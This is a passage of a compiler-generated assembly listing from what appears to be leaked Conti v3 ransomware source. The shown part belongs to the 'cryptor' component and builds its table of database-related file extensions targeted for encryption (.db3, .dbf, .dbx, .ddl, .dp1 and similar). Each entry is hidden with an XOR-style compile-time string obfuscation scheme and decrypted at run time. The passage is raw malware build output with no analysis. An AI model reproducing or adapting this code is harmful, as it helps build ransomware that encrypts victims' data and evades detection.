	00 78		 mov	 BYTE PTR $T30[rbp-254], 120 ; 00000078H
  00ac6	c6 85 53 09 00
	00 27		 mov	 BYTE PTR $T30[rbp-253], 39 ; 00000027H
  00acd	c6 85 54 09 00
	00 78		 mov	 BYTE PTR $T30[rbp-252], 120 ; 00000078H
  00ad4	c6 85 55 09 00
	00 21		 mov	 BYTE PTR $T30[rbp-251], 33 ; 00000021H
  00adb	c6 85 56 09 00
	00 78		 mov	 BYTE PTR $T30[rbp-250], 120 ; 00000078H
  00ae2	c6 85 57 09 00
	00 01		 mov	 BYTE PTR $T30[rbp-249], 1
  00ae9	c6 85 58 09 00
	00 78		 mov	 BYTE PTR $T30[rbp-248], 120 ; 00000078H
  00af0	c6 85 59 09 00
	00 60		 mov	 BYTE PTR $T30[rbp-247], 96 ; 00000060H
  00af7	c6 85 5a 09 00
	00 78		 mov	 BYTE PTR $T30[rbp-246], 120 ; 00000078H
  00afe	c6 85 5b 09 00
	00 1e		 mov	 BYTE PTR $T30[rbp-245], 30
  00b05	c6 85 5c 09 00
	00 78		 mov	 BYTE PTR $T30[rbp-244], 120 ; 00000078H
  00b0c	c6 85 5d 09 00
	00 3f		 mov	 BYTE PTR $T30[rbp-243], 63 ; 0000003fH
  00b13	c6 85 5e 09 00
	00 78		 mov	 BYTE PTR $T30[rbp-242], 120 ; 00000078H
  00b1a	c6 85 5f 09 00
	00 78		 mov	 BYTE PTR $T30[rbp-241], 120 ; 00000078H
  00b21	c6 85 60 09 00
	00 78		 mov	 BYTE PTR $T30[rbp-240], 120 ; 00000078H
  00b28	0f b6 85 51 09
	00 00		 movzx	 eax, BYTE PTR $T30[rbp-255]
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\cryptor.cpp

; 323  : 		OBFW(L".db-wal"),

  00b2f	e8 00 00 00 00	 call	 ?decrypt@?$MetaBuffer@$02$0HI@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@@std@@@@QEAAPEBDXZ ; MetaBuffer<3,120,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15> >::decrypt
  00b34	48 89 85 18 0b
	00 00		 mov	 QWORD PTR Extensions$[rbp-24], rax

; 324  : 		OBFW(L".db3"),

  00b3b	48 8d 8d 80 00
	00 00		 lea	 rcx, QWORD PTR $T31[rbp-256]
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\obfuscation\MetaString.h

; 83   :     volatile bool m_isDecrypted = false;

  00b42	c6 85 80 00 00
	00 00		 mov	 BYTE PTR $T31[rbp-256], 0
  00b49	c6 85 81 00 00
	00 41		 mov	 BYTE PTR $T31[rbp-255], 65 ; 00000041H
  00b50	c6 85 82 00 00
	00 1f		 mov	 BYTE PTR $T31[rbp-254], 31
  00b57	c6 85 83 00 00
	00 00		 mov	 BYTE PTR $T31[rbp-253], 0
  00b5e	c6 85 84 00 00
	00 1f		 mov	 BYTE PTR $T31[rbp-252], 31
  00b65	c6 85 85 00 00
	00 78		 mov	 BYTE PTR $T31[rbp-251], 120 ; 00000078H
  00b6c	c6 85 86 00 00
	00 1f		 mov	 BYTE PTR $T31[rbp-250], 31
  00b73	c6 85 87 00 00
	00 13		 mov	 BYTE PTR $T31[rbp-249], 19
  00b7a	c6 85 88 00 00
	00 1f		 mov	 BYTE PTR $T31[rbp-248], 31
  00b81	c6 85 89 00 00
	00 1f		 mov	 BYTE PTR $T31[rbp-247], 31
  00b88	c6 85 8a 00 00
	00 1f		 mov	 BYTE PTR $T31[rbp-246], 31
  00b8f	0f b6 85 81 00
	00 00		 movzx	 eax, BYTE PTR $T31[rbp-255]
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\cryptor.cpp

; 324  : 		OBFW(L".db3"),

  00b96	e8 00 00 00 00	 call	 ?decrypt@?$MetaBuffer@$0ED@$0BP@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@QEAAPEBDXZ ; MetaBuffer<67,31,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9> >::decrypt
  00b9b	48 89 85 20 0b
	00 00		 mov	 QWORD PTR Extensions$[rbp-16], rax

; 325  : 		OBFW(L".dbc"),

  00ba2	48 8d 8d 90 00
	00 00		 lea	 rcx, QWORD PTR $T32[rbp-256]
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\obfuscation\MetaString.h

; 83   :     volatile bool m_isDecrypted = false;

  00ba9	c6 85 90 00 00
	00 00		 mov	 BYTE PTR $T32[rbp-256], 0
  00bb0	c6 85 91 00 00
	00 6c		 mov	 BYTE PTR $T32[rbp-255], 108 ; 0000006cH
  00bb7	c6 85 92 00 00
	00 0c		 mov	 BYTE PTR $T32[rbp-254], 12
  00bbe	c6 85 93 00 00
	00 2c		 mov	 BYTE PTR $T32[rbp-253], 44 ; 0000002cH
  00bc5	c6 85 94 00 00
	00 0c		 mov	 BYTE PTR $T32[rbp-252], 12
  00bcc	c6 85 95 00 00
	00 54		 mov	 BYTE PTR $T32[rbp-251], 84 ; 00000054H
  00bd3	c6 85 96 00 00
	00 0c		 mov	 BYTE PTR $T32[rbp-250], 12
  00bda	c6 85 97 00 00
	00 40		 mov	 BYTE PTR $T32[rbp-249], 64 ; 00000040H
  00be1	c6 85 98 00 00
	00 0c		 mov	 BYTE PTR $T32[rbp-248], 12
  00be8	c6 85 99 00 00
	00 0c		 mov	 BYTE PTR $T32[rbp-247], 12
  00bef	c6 85 9a 00 00
	00 0c		 mov	 BYTE PTR $T32[rbp-246], 12
  00bf6	0f b6 85 91 00
	00 00		 movzx	 eax, BYTE PTR $T32[rbp-255]
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\cryptor.cpp

; 325  : 		OBFW(L".dbc"),

  00bfd	e8 00 00 00 00	 call	 ?decrypt@?$MetaBuffer@$0GL@$0M@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@QEAAPEBDXZ ; MetaBuffer<107,12,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9> >::decrypt
  00c02	48 89 85 28 0b
	00 00		 mov	 QWORD PTR Extensions$[rbp-8], rax

; 326  : 		OBFW(L".dbf"),

  00c09	48 8d 8d a0 00
	00 00		 lea	 rcx, QWORD PTR $T33[rbp-256]
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\obfuscation\MetaString.h

; 83   :     volatile bool m_isDecrypted = false;

  00c10	c6 85 a0 00 00
	00 00		 mov	 BYTE PTR $T33[rbp-256], 0
  00c17	c6 85 a1 00 00
	00 67		 mov	 BYTE PTR $T33[rbp-255], 103 ; 00000067H
  00c1e	c6 85 a2 00 00
	00 69		 mov	 BYTE PTR $T33[rbp-254], 105 ; 00000069H
  00c25	c6 85 a3 00 00
	00 3e		 mov	 BYTE PTR $T33[rbp-253], 62 ; 0000003eH
  00c2c	c6 85 a4 00 00
	00 69		 mov	 BYTE PTR $T33[rbp-252], 105 ; 00000069H
  00c33	c6 85 a5 00 00
	00 28		 mov	 BYTE PTR $T33[rbp-251], 40 ; 00000028H
  00c3a	c6 85 a6 00 00
	00 69		 mov	 BYTE PTR $T33[rbp-250], 105 ; 00000069H
  00c41	c6 85 a7 00 00
	00 54		 mov	 BYTE PTR $T33[rbp-249], 84 ; 00000054H
  00c48	c6 85 a8 00 00
	00 69		 mov	 BYTE PTR $T33[rbp-248], 105 ; 00000069H
  00c4f	c6 85 a9 00 00
	00 69		 mov	 BYTE PTR $T33[rbp-247], 105 ; 00000069H
  00c56	c6 85 aa 00 00
	00 69		 mov	 BYTE PTR $T33[rbp-246], 105 ; 00000069H
  00c5d	0f b6 85 a1 00
	00 00		 movzx	 eax, BYTE PTR $T33[rbp-255]
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\cryptor.cpp

; 326  : 		OBFW(L".dbf"),

  00c64	e8 00 00 00 00	 call	 ?decrypt@?$MetaBuffer@$0L@$0GJ@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@QEAAPEBDXZ ; MetaBuffer<11,105,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9> >::decrypt
  00c69	48 89 85 30 0b
	00 00		 mov	 QWORD PTR Extensions$[rbp], rax
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\obfuscation\MetaString.h

; 83   :     volatile bool m_isDecrypted = false;

  00c70	c6 85 b0 00 00
	00 00		 mov	 BYTE PTR $T34[rbp-256], 0
  00c77	c6 85 b1 00 00
	00 29		 mov	 BYTE PTR $T34[rbp-255], 41 ; 00000029H
  00c7e	c6 85 b2 00 00
	00 64		 mov	 BYTE PTR $T34[rbp-254], 100 ; 00000064H
  00c85	c6 85 b3 00 00
	00 26		 mov	 BYTE PTR $T34[rbp-253], 38 ; 00000026H
  00c8c	c6 85 b4 00 00
	00 64		 mov	 BYTE PTR $T34[rbp-252], 100 ; 00000064H
  00c93	c6 85 b5 00 00
	00 18		 mov	 BYTE PTR $T34[rbp-251], 24
  00c9a	c6 85 b6 00 00
	00 64		 mov	 BYTE PTR $T34[rbp-250], 100 ; 00000064H

; 51   :         : m_buffer{ encrypt(data[Ints])... }

  00ca1	c6 85 b7 00 00
	00 10		 mov	 BYTE PTR $T34[rbp-249], 16
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\cryptor.cpp

; 327  : 		OBFW(L".dbs"),

  00ca8	48 8d 8d b0 00
	00 00		 lea	 rcx, QWORD PTR $T34[rbp-256]
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\obfuscation\MetaString.h

; 51   :         : m_buffer{ encrypt(data[Ints])... }

  00caf	c6 85 b8 00 00
	00 64		 mov	 BYTE PTR $T34[rbp-248], 100 ; 00000064H
  00cb6	c6 85 b9 00 00
	00 64		 mov	 BYTE PTR $T34[rbp-247], 100 ; 00000064H
  00cbd	c6 85 ba 00 00
	00 64		 mov	 BYTE PTR $T34[rbp-246], 100 ; 00000064H
  00cc4	0f b6 85 b1 00
	00 00		 movzx	 eax, BYTE PTR $T34[rbp-255]
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\cryptor.cpp

; 327  : 		OBFW(L".dbs"),

  00ccb	e8 00 00 00 00	 call	 ?decrypt@?$MetaBuffer@$06$0GE@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@QEAAPEBDXZ ; MetaBuffer<7,100,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9> >::decrypt
  00cd0	48 89 85 38 0b
	00 00		 mov	 QWORD PTR Extensions$[rbp+8], rax

; 328  : 		OBFW(L".dbt"),

  00cd7	48 8d 8d c0 00
	00 00		 lea	 rcx, QWORD PTR $T35[rbp-256]
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\obfuscation\MetaString.h

; 83   :     volatile bool m_isDecrypted = false;

  00cde	c6 85 c0 00 00
	00 00		 mov	 BYTE PTR $T35[rbp-256], 0
  00ce5	c6 85 c1 00 00
	00 04		 mov	 BYTE PTR $T35[rbp-255], 4
  00cec	c6 85 c2 00 00
	00 27		 mov	 BYTE PTR $T35[rbp-254], 39 ; 00000027H
  00cf3	c6 85 c3 00 00
	00 70		 mov	 BYTE PTR $T35[rbp-253], 112 ; 00000070H
  00cfa	c6 85 c4 00 00
	00 27		 mov	 BYTE PTR $T35[rbp-252], 39 ; 00000027H
  00d01	c6 85 c5 00 00
	00 6c		 mov	 BYTE PTR $T35[rbp-251], 108 ; 0000006cH
  00d08	c6 85 c6 00 00
	00 27		 mov	 BYTE PTR $T35[rbp-250], 39 ; 00000027H
  00d0f	c6 85 c7 00 00
	00 11		 mov	 BYTE PTR $T35[rbp-249], 17
  00d16	c6 85 c8 00 00
	00 27		 mov	 BYTE PTR $T35[rbp-248], 39 ; 00000027H
  00d1d	c6 85 c9 00 00
	00 27		 mov	 BYTE PTR $T35[rbp-247], 39 ; 00000027H
  00d24	c6 85 ca 00 00
	00 27		 mov	 BYTE PTR $T35[rbp-246], 39 ; 00000027H
  00d2b	0f b6 85 c1 00
	00 00		 movzx	 eax, BYTE PTR $T35[rbp-255]
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\cryptor.cpp

; 328  : 		OBFW(L".dbt"),

  00d32	e8 00 00 00 00	 call	 ?decrypt@?$MetaBuffer@$01$0CH@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@QEAAPEBDXZ ; MetaBuffer<2,39,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9> >::decrypt
  00d37	48 89 85 40 0b
	00 00		 mov	 QWORD PTR Extensions$[rbp+16], rax

; 329  : 		OBFW(L".dbv"),

  00d3e	48 8d 8d d0 00
	00 00		 lea	 rcx, QWORD PTR $T36[rbp-256]
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\obfuscation\MetaString.h

; 83   :     volatile bool m_isDecrypted = false;

  00d45	c6 85 d0 00 00
	00 00		 mov	 BYTE PTR $T36[rbp-256], 0
  00d4c	c6 85 d1 00 00
	00 36		 mov	 BYTE PTR $T36[rbp-255], 54 ; 00000036H
  00d53	c6 85 d2 00 00
	00 5a		 mov	 BYTE PTR $T36[rbp-254], 90 ; 0000005aH
  00d5a	c6 85 d3 00 00
	00 4e		 mov	 BYTE PTR $T36[rbp-253], 78 ; 0000004eH
  00d61	c6 85 d4 00 00
	00 5a		 mov	 BYTE PTR $T36[rbp-252], 90 ; 0000005aH
  00d68	c6 85 d5 00 00
	00 3f		 mov	 BYTE PTR $T36[rbp-251], 63 ; 0000003fH
  00d6f	c6 85 d6 00 00
	00 5a		 mov	 BYTE PTR $T36[rbp-250], 90 ; 0000005aH
  00d76	c6 85 d7 00 00
	00 56		 mov	 BYTE PTR $T36[rbp-249], 86 ; 00000056H
  00d7d	c6 85 d8 00 00
	00 5a		 mov	 BYTE PTR $T36[rbp-248], 90 ; 0000005aH
  00d84	c6 85 d9 00 00
	00 5a		 mov	 BYTE PTR $T36[rbp-247], 90 ; 0000005aH
  00d8b	c6 85 da 00 00
	00 5a		 mov	 BYTE PTR $T36[rbp-246], 90 ; 0000005aH
  00d92	0f b6 85 d1 00
	00 00		 movzx	 eax, BYTE PTR $T36[rbp-255]
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\cryptor.cpp

; 329  : 		OBFW(L".dbv"),

  00d99	e8 00 00 00 00	 call	 ?decrypt@?$MetaBuffer@$0EH@$0FK@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@QEAAPEBDXZ ; MetaBuffer<71,90,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9> >::decrypt
  00d9e	48 89 85 48 0b
	00 00		 mov	 QWORD PTR Extensions$[rbp+24], rax

; 330  : 		OBFW(L".dbx"),

  00da5	48 8d 8d e0 00
	00 00		 lea	 rcx, QWORD PTR $T37[rbp-256]
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\obfuscation\MetaString.h

; 83   :     volatile bool m_isDecrypted = false;

  00dac	c6 85 e0 00 00
	00 00		 mov	 BYTE PTR $T37[rbp-256], 0
  00db3	c6 85 e1 00 00
	00 3f		 mov	 BYTE PTR $T37[rbp-255], 63 ; 0000003fH
  00dba	c6 85 e2 00 00
	00 2b		 mov	 BYTE PTR $T37[rbp-254], 43 ; 0000002bH
  00dc1	c6 85 e3 00 00
	00 5c		 mov	 BYTE PTR $T37[rbp-253], 92 ; 0000005cH
  00dc8	c6 85 e4 00 00
	00 2b		 mov	 BYTE PTR $T37[rbp-252], 43 ; 0000002bH
  00dcf	c6 85 e5 00 00
	00 3a		 mov	 BYTE PTR $T37[rbp-251], 58 ; 0000003aH
  00dd6	c6 85 e6 00 00
	00 2b		 mov	 BYTE PTR $T37[rbp-250], 43 ; 0000002bH
  00ddd	c6 85 e7 00 00
	00 33		 mov	 BYTE PTR $T37[rbp-249], 51 ; 00000033H
  00de4	c6 85 e8 00 00
	00 2b		 mov	 BYTE PTR $T37[rbp-248], 43 ; 0000002bH
  00deb	c6 85 e9 00 00
	00 2b		 mov	 BYTE PTR $T37[rbp-247], 43 ; 0000002bH
  00df2	c6 85 ea 00 00
	00 2b		 mov	 BYTE PTR $T37[rbp-246], 43 ; 0000002bH
  00df9	0f b6 85 e1 00
	00 00		 movzx	 eax, BYTE PTR $T37[rbp-255]
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\cryptor.cpp

; 330  : 		OBFW(L".dbx"),

  00e00	e8 00 00 00 00	 call	 ?decrypt@?$MetaBuffer@$0BB@$0CL@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@QEAAPEBDXZ ; MetaBuffer<17,43,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9> >::decrypt
  00e05	48 89 85 50 0b
	00 00		 mov	 QWORD PTR Extensions$[rbp+32], rax

; 331  : 		OBFW(L".dcb"),

  00e0c	48 8d 8d f0 00
	00 00		 lea	 rcx, QWORD PTR $T38[rbp-256]
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\obfuscation\MetaString.h

; 83   :     volatile bool m_isDecrypted = false;

  00e13	c6 85 f0 00 00
	00 00		 mov	 BYTE PTR $T38[rbp-256], 0
  00e1a	c6 85 f1 00 00
	00 5b		 mov	 BYTE PTR $T38[rbp-255], 91 ; 0000005bH
  00e21	c6 85 f2 00 00
	00 42		 mov	 BYTE PTR $T38[rbp-254], 66 ; 00000042H
  00e28	c6 85 f3 00 00
	00 20		 mov	 BYTE PTR $T38[rbp-253], 32 ; 00000020H
  00e2f	c6 85 f4 00 00
	00 42		 mov	 BYTE PTR $T38[rbp-252], 66 ; 00000042H
  00e36	c6 85 f5 00 00
	00 6a		 mov	 BYTE PTR $T38[rbp-251], 106 ; 0000006aH
  00e3d	c6 85 f6 00 00
	00 42		 mov	 BYTE PTR $T38[rbp-250], 66 ; 00000042H
  00e44	c6 85 f7 00 00
	00 35		 mov	 BYTE PTR $T38[rbp-249], 53 ; 00000035H
  00e4b	c6 85 f8 00 00
	00 42		 mov	 BYTE PTR $T38[rbp-248], 66 ; 00000042H
  00e52	c6 85 f9 00 00
	00 42		 mov	 BYTE PTR $T38[rbp-247], 66 ; 00000042H
  00e59	c6 85 fa 00 00
	00 42		 mov	 BYTE PTR $T38[rbp-246], 66 ; 00000042H
  00e60	0f b6 85 f1 00
	00 00		 movzx	 eax, BYTE PTR $T38[rbp-255]
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\cryptor.cpp

; 331  : 		OBFW(L".dcb"),

  00e67	e8 00 00 00 00	 call	 ?decrypt@?$MetaBuffer@$0DF@$0EC@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@QEAAPEBDXZ ; MetaBuffer<53,66,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9> >::decrypt
  00e6c	48 89 85 58 0b
	00 00		 mov	 QWORD PTR Extensions$[rbp+40], rax

; 332  : 		OBFW(L".dct"),

  00e73	48 8d 8d 00 01
	00 00		 lea	 rcx, QWORD PTR $T39[rbp-256]
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\obfuscation\MetaString.h

; 83   :     volatile bool m_isDecrypted = false;

  00e7a	c6 85 00 01 00
	00 00		 mov	 BYTE PTR $T39[rbp-256], 0
  00e81	c6 85 01 01 00
	00 53		 mov	 BYTE PTR $T39[rbp-255], 83 ; 00000053H
  00e88	c6 85 02 01 00
	00 4b		 mov	 BYTE PTR $T39[rbp-254], 75 ; 0000004bH
  00e8f	c6 85 03 01 00
	00 78		 mov	 BYTE PTR $T39[rbp-253], 120 ; 00000078H
  00e96	c6 85 04 01 00
	00 4b		 mov	 BYTE PTR $T39[rbp-252], 75 ; 0000004bH
  00e9d	c6 85 05 01 00
	00 25		 mov	 BYTE PTR $T39[rbp-251], 37 ; 00000025H
  00ea4	c6 85 06 01 00
	00 4b		 mov	 BYTE PTR $T39[rbp-250], 75 ; 0000004bH
  00eab	c6 85 07 01 00
	00 33		 mov	 BYTE PTR $T39[rbp-249], 51 ; 00000033H
  00eb2	c6 85 08 01 00
	00 4b		 mov	 BYTE PTR $T39[rbp-248], 75 ; 0000004bH
  00eb9	c6 85 09 01 00
	00 4b		 mov	 BYTE PTR $T39[rbp-247], 75 ; 0000004bH
  00ec0	c6 85 0a 01 00
	00 4b		 mov	 BYTE PTR $T39[rbp-246], 75 ; 0000004bH
  00ec7	0f b6 85 01 01
	00 00		 movzx	 eax, BYTE PTR $T39[rbp-255]
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\cryptor.cpp

; 332  : 		OBFW(L".dct"),

  00ece	e8 00 00 00 00	 call	 ?decrypt@?$MetaBuffer@$0FD@$0EL@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@QEAAPEBDXZ ; MetaBuffer<83,75,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9> >::decrypt
  00ed3	48 89 85 60 0b
	00 00		 mov	 QWORD PTR Extensions$[rbp+48], rax

; 333  : 		OBFW(L".dcx"),

  00eda	48 8d 8d 10 01
	00 00		 lea	 rcx, QWORD PTR $T40[rbp-256]
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\obfuscation\MetaString.h

; 83   :     volatile bool m_isDecrypted = false;

  00ee1	c6 85 10 01 00
	00 00		 mov	 BYTE PTR $T40[rbp-256], 0
  00ee8	c6 85 11 01 00
	00 3f		 mov	 BYTE PTR $T40[rbp-255], 63 ; 0000003fH
  00eef	c6 85 12 01 00
	00 70		 mov	 BYTE PTR $T40[rbp-254], 112 ; 00000070H
  00ef6	c6 85 13 01 00
	00 0b		 mov	 BYTE PTR $T40[rbp-253], 11
  00efd	c6 85 14 01 00
	00 70		 mov	 BYTE PTR $T40[rbp-252], 112 ; 00000070H
  00f04	c6 85 15 01 00
	00 3b		 mov	 BYTE PTR $T40[rbp-251], 59 ; 0000003bH
  00f0b	c6 85 16 01 00
	00 70		 mov	 BYTE PTR $T40[rbp-250], 112 ; 00000070H
  00f12	c6 85 17 01 00
	00 43		 mov	 BYTE PTR $T40[rbp-249], 67 ; 00000043H
  00f19	c6 85 18 01 00
	00 70		 mov	 BYTE PTR $T40[rbp-248], 112 ; 00000070H
  00f20	c6 85 19 01 00
	00 70		 mov	 BYTE PTR $T40[rbp-247], 112 ; 00000070H
  00f27	c6 85 1a 01 00
	00 70		 mov	 BYTE PTR $T40[rbp-246], 112 ; 00000070H
  00f2e	0f b6 85 11 01
	00 00		 movzx	 eax, BYTE PTR $T40[rbp-255]
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\cryptor.cpp

; 333  : 		OBFW(L".dcx"),

  00f35	e8 00 00 00 00	 call	 ?decrypt@?$MetaBuffer@$0EP@$0HA@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@QEAAPEBDXZ ; MetaBuffer<79,112,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9> >::decrypt
  00f3a	48 89 85 68 0b
	00 00		 mov	 QWORD PTR Extensions$[rbp+56], rax

; 334  : 		OBFW(L".ddl"),

  00f41	48 8d 8d 20 01
	00 00		 lea	 rcx, QWORD PTR $T41[rbp-256]
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\obfuscation\MetaString.h

; 83   :     volatile bool m_isDecrypted = false;

  00f48	c6 85 20 01 00
	00 00		 mov	 BYTE PTR $T41[rbp-256], 0
  00f4f	c6 85 21 01 00
	00 00		 mov	 BYTE PTR $T41[rbp-255], 0
  00f56	c6 85 22 01 00
	00 5d		 mov	 BYTE PTR $T41[rbp-254], 93 ; 0000005dH
  00f5d	c6 85 23 01 00
	00 3e		 mov	 BYTE PTR $T41[rbp-253], 62 ; 0000003eH
  00f64	c6 85 24 01 00
	00 5d		 mov	 BYTE PTR $T41[rbp-252], 93 ; 0000005dH
  00f6b	c6 85 25 01 00
	00 3e		 mov	 BYTE PTR $T41[rbp-251], 62 ; 0000003eH
  00f72	c6 85 26 01 00
	00 5d		 mov	 BYTE PTR $T41[rbp-250], 93 ; 0000005dH
  00f79	c6 85 27 01 00
	00 5a		 mov	 BYTE PTR $T41[rbp-249], 90 ; 0000005aH
  00f80	c6 85 28 01 00
	00 5d		 mov	 BYTE PTR $T41[rbp-248], 93 ; 0000005dH
  00f87	c6 85 29 01 00
	00 5d		 mov	 BYTE PTR $T41[rbp-247], 93 ; 0000005dH
  00f8e	c6 85 2a 01 00
	00 5d		 mov	 BYTE PTR $T41[rbp-246], 93 ; 0000005dH
  00f95	0f b6 85 21 01
	00 00		 movzx	 eax, BYTE PTR $T41[rbp-255]
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\cryptor.cpp

; 334  : 		OBFW(L".ddl"),

  00f9c	e8 00 00 00 00	 call	 ?decrypt@?$MetaBuffer@$0ED@$0FN@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@QEAAPEBDXZ ; MetaBuffer<67,93,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9> >::decrypt
  00fa1	48 89 85 70 0b
	00 00		 mov	 QWORD PTR Extensions$[rbp+64], rax

; 335  : 		OBFW(L".dlis"),

  00fa8	48 8d 8d b0 07
	00 00		 lea	 rcx, QWORD PTR $T42[rbp-256]
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\obfuscation\MetaString.h

; 83   :     volatile bool m_isDecrypted = false;

  00faf	c6 85 b0 07 00
	00 00		 mov	 BYTE PTR $T42[rbp-256], 0
  00fb6	c6 85 b1 07 00
	00 2d		 mov	 BYTE PTR $T42[rbp-255], 45 ; 0000002dH
  00fbd	c6 85 b2 07 00
	00 3c		 mov	 BYTE PTR $T42[rbp-254], 60 ; 0000003cH
  00fc4	c6 85 b3 07 00
	00 37		 mov	 BYTE PTR $T42[rbp-253], 55 ; 00000037H
  00fcb	c6 85 b4 07 00
	00 3c		 mov	 BYTE PTR $T42[rbp-252], 60 ; 0000003cH
  00fd2	c6 85 b5 07 00
	00 50		 mov	 BYTE PTR $T42[rbp-251], 80 ; 00000050H
  00fd9	c6 85 b6 07 00
	00 3c		 mov	 BYTE PTR $T42[rbp-250], 60 ; 0000003cH
  00fe0	c6 85 b7 07 00
	00 17		 mov	 BYTE PTR $T42[rbp-249], 23
  00fe7	c6 85 b8 07 00
	00 3c		 mov	 BYTE PTR $T42[rbp-248], 60 ; 0000003cH
  00fee	c6 85 b9 07 00
	00 56		 mov	 BYTE PTR $T42[rbp-247], 86 ; 00000056H
  00ff5	c6 85 ba 07 00
	00 3c		 mov	 BYTE PTR $T42[rbp-246], 60 ; 0000003cH
  00ffc	c6 85 bb 07 00
	00 3c		 mov	 BYTE PTR $T42[rbp-245], 60 ; 0000003cH
  01003	c6 85 bc 07 00
	00 3c		 mov	 BYTE PTR $T42[rbp-244], 60 ; 0000003cH
  0100a	0f b6 85 b1 07
	00 00		 movzx	 eax, BYTE PTR $T42[rbp-255]
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\cryptor.cpp

; 335  : 		OBFW(L".dlis"),

  01011	e8 00 00 00 00	 call	 ?decrypt@?$MetaBuffer@$0BD@$0DM@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@@std@@@@QEAAPEBDXZ ; MetaBuffer<19,60,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11> >::decrypt
  01016	48 89 85 78 0b
	00 00		 mov	 QWORD PTR Extensions$[rbp+72], rax

; 336  : 		OBFW(L".dp1"),

  0101d	48 8d 8d 30 01
	00 00		 lea	 rcx, QWORD PTR $T43[rbp-256]
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\obfuscation\MetaString.h

; 83   :     volatile bool m_isDecrypted = false;

  01024	c6 85 30 01 00
	00 00		 mov	 BYTE PTR $T43[rbp-256], 0
  0102b	c6 85 31 01 00
	00 48		 mov	 BYTE PTR $T43[rbp-255], 72 ; 00000048H
  01032	c6 85 32 01 00
	00 37		 mov	 BYTE PTR $T43[rbp-254], 55 ; 00000037H
  01039	c6 85 33 01 00
	00 67		 mov	 BYTE PTR $T43[rbp-253], 103 ; 00000067H
  01040	c6 85 34 01 00
	00 37		 mov	 BYTE PTR $T43[rbp-252], 55 ; 00000037H
  01047	c6 85 35 01 00
	00 7c		 mov	 BYTE PTR $T43[rbp-251], 124 ; 0000007cH
  0104e	c6 85 36 01 00
	00 37		 mov	 BYTE PTR $T43[rbp-250], 55 ; 00000037H
  01055	c6 85 37 01 00
	00 6d		 mov	 BYTE PTR $T43[rbp-249], 109 ; 0000006dH
  0105c	c6 85 38 01 00
	00 37		 mov	 BYTE PTR $T43[rbp-248], 55 ; 00000037H
  01063	c6 85 39 01 00
	00 37		 mov	 BYTE PTR $T43[rbp-247], 55 ; 00000037H
  0106a	c6 85 3a 01 00
	00 37		 mov	 BYTE PTR $T43[rbp-246], 55 ; 00000037H
  01071	0f b6 85 31 01
	00 00		 movzx	 eax, BYTE PTR $T43[rbp-255]
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\cryptor.cpp

; 336  : 		OBFW(L".dp1"),

  01078	e8 00 00 00 00	 call	 ?decrypt@?$MetaBuffer@$0GB@$0DH@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@QEAAPEBDXZ ; MetaBuffer<97,55,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9> >::decrypt
  0107d	48 89 85 80 0b
	00 00		 mov	 QWORD PTR Extensions$[rbp+80], rax

; 337  : 		OBFW(L".dqy"),

  01084	48 8d 8d 40 01
	00 00		 lea	 rcx, QWORD PTR $T44[rbp-256]
